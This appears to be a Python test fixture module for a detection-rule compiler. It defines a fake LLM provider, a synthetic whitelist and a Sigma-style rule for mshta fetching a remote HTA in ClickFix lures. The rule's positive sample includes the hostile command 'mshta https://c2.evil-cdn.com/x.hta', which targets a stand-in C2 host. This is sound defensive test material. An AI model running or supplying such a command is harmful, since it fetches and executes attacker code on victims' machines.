from __future__ import annotations

import json

from app.compiler.llm import LLMResult
from app.processors.whitelist_filter import RangeSet, WhitelistFilter, WhitelistSources


class FakeProvider:
    name = "fake"
    model = "fake-model-1"

    def __init__(self, response: dict | str) -> None:
        self.response = response
        self.calls: list[dict] = []

    async def generate_json(self, *, system: str, user: str, json_schema: dict) -> LLMResult:
        self.calls.append({"system": system, "user": user, "schema": json_schema})
        text = self.response if isinstance(self.response, str) else json.dumps(self.response)
        return LLMResult(text=text, model=self.model, prompt_tokens=len(user) // 4, output_tokens=len(text) // 4)


def synthetic_whitelist(tenant_domains=("tencongty.vn",)) -> WhitelistFilter:
    sources = WhitelistSources(
        cdn_anycast=RangeSet.from_cidrs(["104.16.0.0/13"]),
        vendor_domains=frozenset({"microsoftonline.com", "microsoft.com"}),
        lots=frozenset({"pages.dev"}),
    )
    return WhitelistFilter(sources, tenant_domains=tenant_domains)


def fv(**kw: str) -> list[dict[str, str]]:
    return [{"field": k, "value": v} for k, v in kw.items()]


def mshta_rule(c2: str = "c2.evil-cdn.com", **overrides) -> dict:
    rule = {
        "title": "mshta from Explorer fetching remote HTA",
        "rationale": "ClickFix lure executes mshta with the C2 URL pasted by the victim.",
        "category": "process_creation",
        "selections": [
            {"name": "sel_parent", "field": "ParentImage", "modifier": "endswith", "values": ["\\explorer.exe"]},
            {"name": "sel_child", "field": "Image", "modifier": "endswith", "values": ["\\mshta.exe"]},
            {"name": "sel_c2", "field": "CommandLine", "modifier": "contains", "values": [c2]},
        ],
        "condition": "sel_parent and sel_child and sel_c2",
        "target_scope": "all_endpoints",
        "positive_samples": [fv(ParentImage="C:\\Windows\\explorer.exe", Image="C:\\Windows\\System32\\MSHTA.EXE",
                                CommandLine=f"mshta https://{c2}/x.hta")],
        "negative_samples": [fv(ParentImage="C:\\Windows\\explorer.exe", Image="C:\\Windows\\System32\\mshta.exe",
                                CommandLine="mshta C:\\apps\\helpdesk.hta")],
        "mitre_techniques": ["T1218.005", "NOT-A-TECHNIQUE"],
        "falsepositives": [],
    }  # fmt: skip
    rule.update(overrides)
    return rule
